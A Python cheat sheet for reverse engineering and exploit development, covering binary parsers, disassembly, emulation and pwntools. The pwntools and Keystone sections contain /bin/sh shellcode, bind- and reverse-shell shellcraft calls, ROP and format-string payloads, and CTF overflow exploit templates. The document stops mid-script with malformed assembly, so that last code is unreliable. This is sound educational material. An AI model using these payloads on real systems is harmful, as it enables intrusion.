# Python for Hackers & Reverse Engineers

A comprehensive guide to Python modules used in reverse engineering, exploit development, and security research.

---

## Table of Contents
1. [Packing & Unpacking Data](#1-packing--unpacking-data)
2. [PE Files (Windows Binaries)](#2-pe-files-windows-binaries)
3. [ELF Files (Linux Binaries)](#3-elf-files-linux-binaries)
4. [LIEF - Multi-Format Binary Parsing](#4-lief---multi-format-binary-parsing)
5. [Capstone - Disassembly Framework](#5-capstone---disassembly-framework)
6. [Keystone - Assembly Framework](#6-keystone---assembly-framework)
7. [Unicorn - CPU Emulation](#7-unicorn---cpu-emulation)
8. [Pwntools - Exploit Development](#8-pwntools---exploit-development)
9. [Frida - Dynamic Instrumentation](#9-frida---dynamic-instrumentation)
10. [Angr - Binary Analysis Platform](#10-angr---binary-analysis-platform)
11. [Ctypes - C Foreign Function Library](#11-ctypes---c-foreign-function-library)
12. [Socket - Low-Level Networking](#12-socket---low-level-networking)
13. [Useful Standard Library Modules](#13-useful-standard-library-modules)
14. [Cheatsheet & Quick Reference](#14-cheatsheet--quick-reference)

---

## 1. Packing & Unpacking Data

### `struct` — Interpret bytes as packed binary data

Standard library module. Essential for parsing binary protocols, file formats, and memory dumps.

```python
import struct

# Pack integers into bytes
struct.pack('<I', 0xdeadbeef)    # little-endian 32-bit -> b'\xef\xbe\xad\xde'
struct.pack('>I', 0xdeadbeef)    # big-endian 32-bit    -> b'\xde\xad\xbe\xef'
struct.pack('H', 0x4141)         # 16-bit unsigned      -> b'AA'

# Unpack bytes into integers
val = struct.unpack('<I', data)[0]   # first 4 bytes as LE uint32
val = struct.unpack('>Q', data)[0]   # first 8 bytes as BE uint64

# Format characters:
# < = little-endian, > = big-endian, ! = network (big-endian)
# x = pad byte, b/B = signed/unsigned byte
# h/H = signed/unsigned short (2B)
# i/I = signed/unsigned int (4B)
# q/Q = signed/unsigned long long (8B)
# s  = char[] (bytes), p = pascal string
# f/d = float/double

# Parse multiple values at once
a, b, c = struct.unpack('<IHB', data)  # uint32 + uint16 + uint8

# Pack into a pre-allocated buffer
buf = bytearray(1024)
struct.pack_into('<I', buf, 0, 0xdeadbeef)  # offset 0
struct.pack_into('<H', buf, 4, 0x4141)      # offset 4
```

### `bytes` & `bytearray`

```python
# bytes (immutable)
data = b'\x90\x90\x90\x90'          # NOP sled
data = bytes([0x90, 0x90, 0x90])    # from list of ints
data[0]                              # -> 144 (int) NOT bytes!

# bytearray (mutable)
buf = bytearray(b'\x00' * 100)
buf[0:4] = b'\x90\x90\x90\x90'      # slice assignment works
buf[0] = 0x90                        # assign int to single element

# Useful operations
b'\x41\x42\x43'.hex()                # -> '414243'
bytes.fromhex('414243')              # -> b'ABC'
b'hello'.hex(' ')                    # -> '68 65 6c 6c 6f' (Python 3.8+)
b'\x41'.decode()                     # -> 'A'
'ABC'.encode()                       # -> b'\x41\x42\x43'
```

### `binascii` — Convert between binary and ASCII

```python
import binascii

binascii.hexlify(b'\xde\xad')        # -> b'dead'
binascii.unhexlify('deadbeef')       # -> b'\xde\xad\xbe\xef'
binascii.crc32(b'hello')             # -> CRC32 checksum
```

### Tips & Tricks

- Use `memoryview` and `cast()` to reinterpret binary data without copying
- Network byte order is big-endian — use `!` prefix or `socket.ntohl()`
- For bit-level manipulation, combine with bitwise ops: `(val >> 8) & 0xFF`
- When parsing unknown binary, use `struct.calcsize(fmt)` to verify sizes
- Use `int.from_bytes(data, 'little')` and `int.to_bytes(val, 4, 'little')` to avoid `struct` for simple cases

---

## 2. PE Files (Windows Binaries)

### `pefile` — Portable Executable reader module

**Install:** `pip install pefile`

```python
import pefile

# Load a PE file
pe = pefile.PE('C:\\Windows\\System32\\kernel32.dll')
# or from raw bytes
with open('file.exe', 'rb') as f:
    pe = pefile.PE(data=f.read())

# Dump all info
pe.print_info()

# Headers
pe.DOS_HEADER.e_magic         # 0x5A4D ('MZ')
pe.DOS_HEADER.e_lfanew        # offset to PE header
pe.NT_HEADERS.Signature       # 0x4550 ('PE')
pe.FILE_HEADER.Machine        # 0x14C (x86), 0x8664 (x64)
pe.FILE_HEADER.NumberOfSections
pe.OPTIONAL_HEADER.ImageBase
pe.OPTIONAL_HEADER.AddressOfEntryPoint
pe.OPTIONAL_HEADER.Subsystem  # 2=GUI, 3=Console, 1=Driver

# Sections
for section in pe.sections:
    print(f"{section.Name.decode('utf-8','ignore').strip(chr(0)):20s} "
          f"VA: 0x{section.VirtualAddress:08x} "
          f"Size: 0x{section.Misc_VirtualSize:08x} "
          f"Raw: 0x{section.SizeOfRawData:08x}")
    # Check section characteristics
    if section.IMAGE_SCN_MEM_EXECUTE:
        print("  -> Executable")
    if section.IMAGE_SCN_MEM_READ:
        print("  -> Readable")
    if section.IMAGE_SCN_MEM_WRITE:
        print("  -> Writable")

# Imports
pe.parse_data_directories()
if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        print(f"[{entry.dll.decode()}]")
        for imp in entry.imports:
            if imp.name:
                print(f"    {imp.name.decode()} @ 0x{imp.address:x}")
            else:
                print(f"    ord({imp.ordinal}) @ 0x{imp.address:x}")

# Exports
if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        print(f"  {exp.name.decode() if exp.name else 'ord('+str(exp.ordinal)+')'} "
              f"@ 0x{exp.address:x}")

# Resources
if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
    for resource_type in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        print(f"Type: {resource_type.name}")

# Get data at a specific RVA
data = pe.get_data(rva, length)
# Get data at a specific offset
data = pe.get_data_from_offset(offset, length)

# Section data as bytes
text_section = pe.sections[0]
code = text_section.get_data()

# Modify and save
pe.OPTIONAL_HEADER.AddressOfEntryPoint = 0xdeadbeef
pe.write(filename='patched.exe')

# Fast load (skip parsing directories)
pe = pefile.PE('file.exe', fast_load=True)
pe.parse_data_directories(directories=[
    pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT'],
    pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT'],
])
```

### Tips & Tricks

- Malware often corrupts headers — use `fast_load=True` and selectively parse directories to avoid crashes
- Check `pe.OPTIONAL_HEADER.DllCharacteristics` for ASLR (`0x40`), NX (`0x100`), etc.
- `pe.sections[0].get_data()` returns raw section bytes — use for code extraction
- `pe.get_data(rva, size)` retrieves data by virtual address (handles section boundaries)
- Use `pe.write()` to fix malformed headers that analysis tools reject
- Rich Header (compiler info) available at `pe.RICH_HEADER`
- Debug info: `pe.DIRECTORY_ENTRY_DEBUG` contains debug directory entries
- Certificate / Authenticode: `pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]`
- TLS callbacks: `pe.DIRECTORY_ENTRY_TLS` for anti-debug / initialization

---

## 3. ELF Files (Linux Binaries)

### `pyelftools` — Pure-Python ELF and DWARF parser

**Install:** `pip install pyelftools`

```python
from elftools.elf.elffile import ELFFile
from elftools.elf.constants import SH_TYPE, PT_TYPE
from elftools.elf.segments import Segment
from elftools.elf.sections import Section, SymbolTableSection

# Open ELF file
with open('/bin/ls', 'rb') as f:
    elf = ELFFile(f)

    # ELF Header
    elf.header.e_type          # ET_EXEC (2), ET_DYN (3), ET_REL (1)
    elf.header.e_machine       # EM_X86_64 (62), EM_386 (3)
    elf.header.e_entry         # Entry point
    elf.header.e_phoff         # Program header offset
    elf.header.e_shoff         # Section header offset
    elf.header.e_flags
    elf.header.e_ehsize        # ELF header size
    elf.header.e_phentsize     # Program header entry size
    elf.header.e_phnum         # Number of program headers
    elf.header.e_shentsize     # Section header entry size
    elf.header.e_shnum         # Number of sections
    elf.header.e_shstrndx      # Section header string table index

    # Sections
    for section in elf.iter_sections():
        print(f"0x{section.header.sh_addr:08x} {section.name:20s} "
              f"size=0x{section.header.sh_size:08x} "
              f"offset=0x{section.header.sh_offset:08x}")

    # Get a specific section
    text = elf.get_section_by_name('.text')
    if text:
        code = text.data()  # raw bytes
        addr = text.header.sh_addr  # base address

    # Program Headers (segments)
    for seg in elf.iter_segments():
        print(f"0x{seg.header.p_vaddr:08x} type={seg.header.p_type} "
              f"flags={seg.header.p_flags:03o} "
              f"filesz=0x{seg.header.p_filesz:08x} "
              f"memsz=0x{seg.header.p_memsz:08x}")

    # Check segment permissions
    for seg in elf.iter_segments():
        flags = seg.header.p_flags
        r = bool(flags & 4)  # PF_R
        w = bool(flags & 2)  # PF_W
        x = bool(flags & 1)  # PF_X

    # Symbols
    symtab = elf.get_section_by_name('.symtab')
    if symtab and isinstance(symtab, SymbolTableSection):
        for sym in symtab.iter_symbols():
            if sym.name:
                print(f"0x{sym.entry.st_value:016x} {sym.name}")

    # Dynamic symbols (for PIE/shared libs)
    dynsym = elf.get_section_by_name('.dynsym')
    if dynsym and isinstance(dynsym, SymbolTableSection):
        for sym in dynsym.iter_symbols():
            if sym.name:
                print(f"0x{sym.entry.st_value:016x} {sym.name}")

    # Relocations
    reloc_section = elf.get_section_by_name('.rela.dyn')
    if reloc_section:
        for reloc in reloc_section.iter_relocations():
            sym = reloc.symbol_entry
            print(f"Offset: 0x{reloc.entry.r_offset:016x} "
                  f"Type: {reloc.entry.r_info_type} "
                  f"Symbol: {sym.name if sym else 'None'}")

    # Check if PIE
    is_pie = elf.header.e_type == 'ET_DYN'
    # Check arch
    is_64bit = elf.elf_class == 2  # ELFCLASS64
    is_little = elf.little_endian  # else big endian
```

### DWARF Debug Info

```python
from elftools.dwarf.dwarfinfo import DWARFInfo

if elf.has_dwarf_info():
    dwarfinfo = elf.get_dwarf_info()

    # Iterate compile units
    for cu in dwarfinfo.iter_CUs():
        top_die = cu.get_top_DIE()
        print(f"Compile Unit: {top_die.attributes.get('DW_AT_name', None)}")

        # Iterate DIEs
        for die in cu.iter_DIEs():
            if die.tag == 'DW_TAG_subprogram':
                name = die.attributes.get('DW_AT_name', None)
                if name:
                    low = die.attributes.get('DW_AT_low_pc', None)
                    high = die.attributes.get('DW_AT_high_pc', None)
                    print(f"Function: {name.value} @ 0x{low.value:x}")
```

### Tips & Tricks

- Use `elf.get_segment_by_type('PT_LOAD')` to iterate loadable segments
- When parsing malware, check for corrupted section headers with `elf.valid_dyn()`
- `readelf.py` ships with pyelftools as a full-featured example
- For packed/obfuscated ELFs, check `elf.header.e_shoff == 0` (section table stripped)
- DWARF parsing is slow on large binaries — only use when necessary
- Use `elf.get_section_by_name('.interp')` to get the dynamic linker path
- Check `elf.header.e_flags` for arch-specific flags (e.g., EF_ARM_*)

---

## 4. LIEF - Multi-Format Binary Parsing

### `lief` — Library to Instrument Executable Formats

**Install:** `pip install lief`

Parses and modifies PE, ELF, MachO, and more in a unified API. Supports writing modifications back.

```python
import lief

# Universal parse (auto-detects format)
binary = lief.parse('/bin/ls')
binary = lief.parse('C:\\Windows\\explorer.exe')

# === ELF ===
elf = lief.ELF.parse('/bin/ls')

elf.entrypoint                          # Entry point address
elf.imagebase                           # Base address
elf.type                                # lief.ELF.E_TYPE.DYNAMIC (PIE)
elf.is_pie                              # True/False
elf.has_nx                              # NX bit enabled
elf.has_interpreter

for section in elf.sections:
    section.name
    section.virtual_address
    section.size
    section.content                      # bytes
    section.type                         # lief.ELF.SECTION_TYPES

for segment in elf.segments:
    segment.type                         # lief.ELF.SEGMENT_TYPES
    segment.virtual_address
    segment.virtual_size
    segment.physical_size
    segment.content
    segment.has(lief.ELF.SEGMENT_FLAGS.R)
    segment.has(lief.ELF.SEGMENT_FLAGS.W)
    segment.has(lief.ELF.SEGMENT_FLAGS.X)

for sym in elf.dynamic_symbols:
    sym.name, sym.value, sym.size

for reloc in elf.relocations:
    reloc.address, reloc.type, reloc.addend

# Write modifications
elf.patch_address(0x4000, b'\x90\x90\x90\x90')  # NOP at address
elf.write('patched.elf')

# === PE ===
pe = lief.PE.parse('C:\\Windows\\System32\\notepad.exe')

pe.entrypoint
pe.imagebase
pe.characteristics                     # DLL characteristics

for section in pe.sections:
    section.name
    section.virtual_address
    section.size
    section.content
    section.has_characteristic(lief.PE.SECTION_CHARACTERISTICS.MEM_EXECUTE)

for imp in pe.imports:
    imp.name                            # DLL name
    for entry in imp.entries:
        entry.name                      # Function name
        entry.address                   # IAT address

for exp in pe.exported_functions:
    exp.name, exp.address

for data_dir in pe.data_directories:
    data_dir.type, data_dir.rva, data_dir.size

# Resources
for resource in pe.resources:
    resource.id, resource.name

# === MachO ===
macho = lief.MachO.parse('/usr/bin/ssh')
if isinstance(macho, list):             # Universal/FAT binary
    macho = macho[0]

for section in macho.sections:
    section.name, section.address, section.size

for symbol in macho.symbols:
    symbol.name, symbol.value

# === Abstracted API ===
binary = lief.parse('/bin/ls')
binary.entrypoint
binary.imagebase
binary.sections                        # works for all formats
binary.symbols

# Patch
binary.patch_address(addr, b'\x90\x90')  # cross-format
binary.patch_code(addr, code_bytes)
```

### Tips & Tricks

- LIEF's `patch_address()` is format-aware (handles VA -> file offset conversion)
- Use `lief.ELF.Binary.create('x86-64')` to create ELFs from scratch
- Use `pe.resources_manager` to manipulate icons, manifests, version info
- LIEF can hook PE imports with `pe.hook_function()`
- Use `binary.exported_functions` for a format-agnostic list of exports

---

## 5. Capstone - Disassembly Framework

### `capstone` — Multi-architecture disassembly engine

**Install:** `pip install capstone`

```python
from capstone import *

# === x86-64 ===
CODE = b'\x55\x48\x8b\x05\xb8\x13\x00\x00'
md = Cs(CS_ARCH_X86, CS_MODE_64)
for insn in md.disasm(CODE, 0x1000):
    print(f"0x{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")

# Output:
# 0x1000: push    rbp
# 0x1001: mov     rax, qword ptr [rip + 0x13b8]

# === ARM (Thumb) ===
md = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
code = b'\x01\x20\x02\x21'            # movs r0, #1; movs r1, #2
for insn in md.disasm(code, 0):
    print(f"0x{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")

# === ARM64 ===
md = Cs(CS_ARCH_AARCH64, CS_MODE_ARM)

# === MIPS ===
md = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 | CS_MODE_BIG_ENDIAN)

# === RISC-V ===
md = Cs(CS_ARCH_RISCV, CS_MODE_RISCV64)

# === Architecture list ===
# CS_ARCH_X86, CS_ARCH_ARM, CS_ARCH_ARM64, CS_ARCH_MIPS
# CS_ARCH_PPC, CS_ARCH_SPARC, CS_ARCH_SYSZ, CS_ARCH_RISCV
# CS_ARCH_RISCV, CS_ARCH_WASM, CS_ARCH_BPF

# === Detailed instruction info ===
md = Cs(CS_ARCH_X86, CS_MODE_64)
md.detail = True  # enable detailed info
for insn in md.disasm(b'\x48\x31\xc0', 0x1000):  # xor rax, rax
    print(f"Address:  0x{insn.address:x}")
    print(f"Bytes:    {insn.bytes.hex()}")
    print(f"Mnemonic: {insn.mnemonic}")
    print(f"OpStr:    {insn.op_str}")
    print(f"Size:     {insn.size}")
    print(f"ID:       {insn.id}")          # instruction ID
    print(f"Group:    {insn.group}")        # CS_GRP_*

    # Register operands
    for op in insn.operands:
        if op.type == X86_OP_REG:
            print(f"  Reg operand: {insn.reg_name(op.reg)}")
        elif op.type == X86_OP_IMM:
            print(f"  Imm operand: 0x{op.value.imm:x}")
        elif op.type == X86_OP_MEM:
            print(f"  Mem operand: [segment:{op.value.mem.segment} "
                  f"base:{op.value.mem.base} index:{op.value.mem.index} "
                  f"scale:{op.value.mem.scale} disp:0x{op.value.mem.disp:x}]")

    # Read/write registers
    print(f"  Regs read:  {[insn.reg_name(r) for r in insn.regs_read]}")
    print(f"  Regs write: {[insn.reg_name(r) for r in insn.regs_write]}")

    # Groups
    if insn.group(CS_GRP_JUMP):
        print("  -> Branch/jump instruction")
    if insn.group(CS_GRP_CALL):
        print("  -> Call instruction")
    if insn.group(CS_GRP_RET):
        print("  -> Return instruction")
    if insn.group(CS_GRP_INT):
        print("  -> Interrupt instruction")

# === Lightweight API (faster, less detail) ===
md = Cs(CS_ARCH_X86, CS_MODE_64)
for addr, size, mnemonic, op_str in md.disasm_lite(code, 0):
    print(f"0x{addr:x}:\t{mnemonic}\t{op_str}")

# === Skip data mode ===
md.skipdata = True          # skip invalid bytes instead of stopping
md.skipdata_setup = ('.byte', None, None)
```

### Tips & Tricks

- Use `md.disasm_lite()` for 30% faster disassembly when only mnemonic/op_str needed
- Set `md.detail = True` only when you need register/operand info (slower)
- Use `skipdata = True` for disassembling mixed code/data
- For malware analysis, `CS_GRP_*` groups help identify control flow
- Combine with section `.get_data()` from pefile/pyelftools to disassemble specific sections
- `insn.regs_read` and `insn.regs_write` enable taint tracking / data flow analysis

---

## 6. Keystone - Assembly Framework

### `keystone` — Multi-architecture assembler

**Install:** `pip install keystone-engine`

```python
from keystone import *

# === x86-64 ===
ks = Ks(KS_ARCH_X86, KS_MODE_64)
code, count = ks.asm("mov rax, 0xdeadbeef; jmp rax")
print(code.hex())           # -> 48c7c0efbeaddeffe0
print(count)                # -> 2 instructions

# === x86-32 ===
ks = Ks(KS_ARCH_X86, KS_MODE_32)
code, count = ks.asm("push 0x41414141; call eax")

# === ARM ===
ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
code, _ = ks.asm("mov r0, #42; add r1, r0, #1")

# === ARM Thumb ===
ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)
code, _ = ks.asm("movs r0, #1; movs r1, #2")

# === ARM64 ===
ks = Ks(KS_ARCH_ARM64, KS_MODE_ARM)

# === MIPS ===
ks = Ks(KS_ARCH_MIPS, KS_MODE_MIPS32 | KS_MODE_BIG_ENDIAN)

# === Control assembly options ===
ks = Ks(KS_ARCH_X86, KS_MODE_64)
ks.syntax = KS_OPT_SYNTAX_INTEL   # default intel
ks.syntax = KS_OPT_SYNTAX_ATT     # AT&T syntax

# === Synthesizing shellcode ===
shellcode = b""
for instr in [
    "xor eax, eax",
    "push eax",
    "push 0x68732f2f",    # "//sh"
    "push 0x6e69622f",    # "/bin"
    "mov ebx, esp",
    "xor ecx, ecx",
    "xor edx, edx",
    "mov al, 0xb",        # execve syscall
    "int 0x80",
]:
    code, _ = ks.asm(instr)
    shellcode += bytes(code)

# === Pseudo-instructions & symbol support ===
# Keystone can resolve labels (basic)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
ks.symbols = {'my_func': 0x4000, 'data_ptr': 0x6000}
code, _ = ks.asm("call my_func; mov rax, [data_ptr]")
```

### Tips & Tricks

- Use `KS_OPT_SYNTAX_NASM` for NASM-style syntax
- For shellcode: minimize null bytes (`xor reg, reg` instead of `mov reg, 0`)
- Combine with pwntools `asm()` for easier shellcode (handles `context.arch`)
- Keystone resolves labels for basic branching
- For complex shellcode, prefer pwntools `shellcraft`

---

## 7. Unicorn - CPU Emulation

### `unicorn` — Multi-architecture CPU emulator (based on QEMU)

**Install:** `pip install unicorn`

```python
from unicorn import *
from unicorn.x86_const import *

# === Basic x86-32 emulation ===
X86_CODE32 = b'\x41\x4a'  # INC ecx; DEC edx

mu = Uc(UC_ARCH_X86, UC_MODE_32)

# Map 2MB memory
ADDRESS = 0x1000000
mu.mem_map(ADDRESS, 2 * 1024 * 1024)

# Write code to memory
mu.mem_write(ADDRESS, X86_CODE32)

# Initialize registers
mu.reg_write(UC_X86_REG_ECX, 0x1234)
mu.reg_write(UC_X86_REG_EDX, 0x7890)

# Emulate
mu.emu_start(ADDRESS, ADDRESS + len(X86_CODE32))

# Read results
ecx = mu.reg_read(UC_X86_REG_ECX)     # 0x1235
edx = mu.reg_read(UC_X86_REG_EDX)     # 0x788F

# === x86-64 ===
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(ADDRESS, 2 * 1024 * 1024)
mu.mem_write(ADDRESS, b'\x48\x31\xc0')   # xor rax, rax
mu.emu_start(ADDRESS, ADDRESS + 3)
rax = mu.reg_read(UC_X86_REG_RAX)         # 0

# === ARM ===
from unicorn.arm_const import *

mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)
mu.mem_map(ADDRESS, 2 * 1024 * 1024)
code = b'\x01\x20\xa0\xe3\x02\x21\xa0\xe3'  # mov r0, #1; mov r1, #2
mu.mem_write(ADDRESS, code)
mu.reg_write(UC_ARM_REG_R0, 0)
mu.reg_write(UC_ARM_REG_R1, 0)
mu.emu_start(ADDRESS, ADDRESS + len(code))
r0 = mu.reg_read(UC_ARM_REG_R0)  # 1
r1 = mu.reg_read(UC_ARM_REG_R1)  # 2

# === ARM64 (AArch64) ===
from unicorn.aarch64_const import *

mu = Uc(UC_ARCH_ARM64, UC_MODE_ARM)
mu.mem_map(ADDRESS, 2 * 1024 * 1024)
mu.mem_write(ADDRESS, b'\x00\x00\x80\x52')  # mov w0, #0
mu.emu_start(ADDRESS, ADDRESS + 4)

# === Hooks ===

# 1. Code hook (trace every instruction)
def hook_code(mu, address, size, user_data):
    print(f">>> Tracing instruction at 0x{address:x}, size={size}")

mu.hook_add(UC_HOOK_CODE, hook_code)

# 2. Memory access hook
def hook_mem(mu, access, address, size, value, user_data):
    if access == UC_MEM_WRITE:
        print(f">>> Memory WRITE at 0x{address:x}, value=0x{value:x}")
    else:  # UC_MEM_READ
        print(f">>> Memory READ at 0x{address:x}, size={size}")

mu.hook_add(UC_HOOK_MEM_READ | UC_HOOK_MEM_WRITE, hook_mem)

# 3. Memory unmapped (page fault) handler
def hook_unmapped(mu, access, address, size, value, user_data):
    print(f">>> Unmapped memory access at 0x{address:x}")
    # Can map memory on the fly
    mu.mem_map(address & ~0xFFF, 0x1000)
    return True  # retry

mu.hook_add(UC_HOOK_MEM_UNMAPPED, hook_unmapped)

# === Stack setup ===
STACK_ADDR = 0x2000000
STACK_SIZE = 0x100000
mu.mem_map(STACK_ADDR, STACK_SIZE)
mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + STACK_SIZE - 0x100)
# x64
mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - 0x100)

# === Emulate with time/instruction limits ===
mu.emu_start(ADDRESS, ADDRESS + 0x100, timeout=1000*1000)    # 1 second timeout
mu.emu_start(ADDRESS, ADDRESS + 0x100, count=1000)           # 1000 instructions max

# === Stop emulation ===
mu.emu_stop()

# === Context save/restore ===
ctx = mu.context_save()
# ... do stuff ...
mu.context_restore(ctx)  # reset to saved state
```

### Tips & Tricks

- Always map a stack region before emulating function calls
- Use hooks to handle syscalls — check memory at RIP/EIP for `syscall`/`int 0x80`
- `UC_HOOK_MEM_UNMAPPED` allows on-demand memory mapping (handles embedded pointers)
- Use `context_save()`/`context_restore()` for snapshot-based analysis
- For malware analysis: hook `UC_HOOK_CODE` to trace execution flow
- Set instruction count limit to avoid infinite loops from obfuscated code
- Combine with Capstone to disassemble traced instructions in hooks

---

## 8. Pwntools - Exploit Development

### `pwn` — CTF framework & exploit development library

**Install:** `pip install pwntools`

```python
from pwn import *

# === Context Setup ===
context.arch = 'i386'       # or 'amd64', 'arm', 'aarch64', 'mips', etc.
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
context.log_level = 'info'  # 'debug', 'info', 'warn', 'error'

# Shortcut
context(arch='amd64', os='linux')

# === Tubes: Process & Network I/O ===
# Local process
p = process('./vuln')
p = process(['./vuln', 'arg1', 'arg2'])

# Remote connection
p = remote('example.com', 1337)

# SSH
s = ssh('user', 'host', password='pass', port=22)
p = s.process('./vuln')
s.download_file('/remote/path')
s.upload_file('/local/path', '/remote/path')

# Serial
from pwn import serialtube
p = serialtube('/dev/ttyUSB0', baudrate=115200)

# I/O methods
p.send(b'hello')             # raw bytes
p.sendline(b'hello')         # with newline
p.sendafter(b'> ', b'input') # sends after receiving delimiter
p.sendlineafter(b'> ', b'input')

data = p.recv(1024)          # receive N bytes
data = p.recvline()           # receive until newline
data = p.recvuntil(b'> ')    # receive until delimiter
data = p.recvall()            # receive all (closes connection)
all_data = p.recvrepeat(timeout=2)

p.interactive()               # interactive shell

# === Packing/Unpacking ===
p32(0xdeadbeef)               # b'\xef\xbe\xad\xde' (LE 32-bit)
p64(0xdeadbeef)               # b'\xef\xbe\xad\xde\x00\x00\x00\x00' (LE 64-bit)
u32(b'\xef\xbe\xad\xde')      # 0xdeadbeef
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')

p8(0x41)                      # single byte
u8(b'A')                      # 0x41

p16(0x4142)                   # 2 bytes
u16(b'BA')                    # 0x4142

# Network byte order (big-endian)
p32(0xdeadbeef, endian='big') # b'\xde\xad\xbe\xef'

# Sign-extension
p32(0xffffffff, sign=True)    # b'\x00\x00\x00\x80' (32-bit signed min)

# === ELF Analysis ===
elf = ELF('./vuln')

# Get symbols
elf.symbols['main']           # address of main
elf.symbols['puts']
elf.got['puts']               # GOT entry for puts
elf.plt['system']             # PLT entry for system
elf.plt['puts']

# Search for gadgets
elf.search(b'/bin/sh').__next__()   # address of /bin/sh string

# Sections
elf.sections['.text'].header.sh_addr
elf.bss()                     # base of .bss
elf.entry                     # entry point

# Read memory from binary
elf.read(elf.symbols['main'], 0x100)

# === ROP Chain Building ===
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
print(rop.dump())
payload = rop.chain()

# Or manually find gadgets
rop.find_gadget(['pop rdi', 'ret'])  # returns Gadget object
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

# Direct search
pop_rdi = next(rop.search(RopGadget(['pop rdi', 'ret'])))

# === Shellcode Generation ===
shellcraft.sh()               # execve /bin/sh shellcode
shellcraft.cat('flag.txt')    # cat flag shellcode
shellcraft.findpeer(31337)    # connect-back shell
shellcraft.bindsh(4444)       # bind shell on port 4444
shellcraft.connect('10.0.0.1', 4444)  # reverse connect
shellcraft.amd64.linux.sh()   # explicit arch

# Custom assembly
asm('xor eax, eax; inc eax')  # assemble bytes
asm(shellcraft.sh())           # same as below but explicit
asm('nop', arch='arm')         # cross-arch assembly

# Disassembly
print(disasm(b'\x90\x90'))
disasm(b'\x48\x31\xc0', arch='amd64')

# === Format String Helper ===
payload = fmtstr_payload(offset, {target: value})
payload = fmtstr_payload(6, {elf.got['puts']: elf.plt['system']})

# === Cyclic Pattern (for offset finding) ===
pattern = cyclic(200)
# Run with pattern, get crash address (e.g., 0x6161616c)
offset = cyclic_find(0x6161616c)   # or cyclic_find(b'laaa')
# offset = 140 (example)

# === Flat payload builder ===
payload = flat({
    0: b'AAAA',
    8: p32(0xdeadbeef),
    16: p32(elf.plt['system']),
    24: p32(0x41414141),  # fake return
    32: next(elf.search(b'/bin/sh')),
})
# Equivalent:
payload = b'AAAA' + b'\x00' * 4 + p32(0xdeadbeef) + ...

# === GDB Integration ===
p = process('./vuln')
# gdb.attach(p)  # attach gdb to process
# gdb.attach(p, gdbscript='break main\ncontinue')
# gdb.attach(('localhost', 1337))  # attach to remote gdbserver

# === Assembly helpers ===
# NOP sled
asm('nop') * 32

# Make ELF executable and run step by step
context.binary = './vuln'

# Set binary's libc for ret2libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked_libc - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
```

### Tips & Tricks

- `context.log_level = 'debug'` shows all sent/received data (invaluable for debugging)
- Use `ELF(path, checksec=False)` to skip security checks on broken binaries
- `flat()` auto-pads and packs — much cleaner than manual `p32()` concatenation
- `fmtstr_payload()` auto-generates format string exploits, but you need the stack offset
- `cyclic()` + GDB is the fastest way to find buffer overflow offsets
- Use `p.interactive()` to drop into manual interaction after the exploit runs
- `process()` accepts `env={}` to control the environment (e.g., skip LD_PRELOAD)
- `ssh` tube works like a normal tube — truly interchangeable
- Libc database lookup: `libc = ELF('./libc.so.6')` then `libc.libc_start_main_return`

### Example Scripts
- `Basic checking manually`
```python
from pwn import (p32,ELF)
file = ELF('') #filename
proc = file.process() #process
target = p32(file.symbols["hacked"])    #function
payload = b"".join([
    b"A" * 28,
    target,
    p32(0xdeadbeef),
    ])
proc.sendlineafter(b":",payload)
print(proc.recvall().decode('latin-1'))
#proc.interactive()     #interactive mode
```

- `With argparse for both remote and local exploitation`
```python
import argparse
from pwn import (p32,ELF,ROP,gdb,remote,log,context,process, warning,cyclic,cyclic_find,info)

def find_position(file):
    process = file.process()
    process.sendlineafter(b':', cyclic(200))
    process.wait()
    ip_offset = ""
    if ELF.bits == 32:
        ip_offset = cyclic_find(process.corefile.pc)
    elif ELF.bits == 64:
        ip_offset = cyclic_find(process.corefile.read(process.corefile.sp, 8))
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return int(ip_offset)

def setup_target():
    parser = argparse.ArgumentParser(description="Binary interaction template")
    subparsers = parser.add_subparsers(dest="mode", required=True, help="Mode of operation")

    local_parser = subparsers.add_parser("local", help="Run against a local process")
    local_parser.add_argument("type", default="normal",choices=["debug","normal","rop"], help="Select the type of local way to run")
    local_parser.add_argument("binary", help="Path to local binary")

    remote_parser = subparsers.add_parser("remote", help="Connect to a remote service")
    remote_parser.add_argument("host", help="Remote host (required for remote mode)")
    remote_parser.add_argument("port", type=int, help="Remote port (required for remote mode)")
    remote_parser.add_argument("binary", help="Path to local binary")

    args = parser.parse_args()

    try:
        elf = ELF(args.binary)
        context.binary = elf
    except FileNotFoundError as f:
        log.warning(f"Could not load ELF file: {f}")
    except Exception as e:
        log.warning(f"unknown error: {e}")

    if args.mode == "local":
        if args.type == "normal":
            log.info(f"Starting local process: {args.binary}")
            #this is an example
            file = ELF(args.binary)
            proc = file.process()

            context.arch = file.arch
            context.os = file.os
            shellcode = asm(shellcraft.cat('flag.txt'))
            shellcode += asm(shellcraft.exit())
            shellcode += asm("""
                            xor eax,eax
                            push eax,
                            mov ebx, 0x68732f6e9622f2
                            push ebx
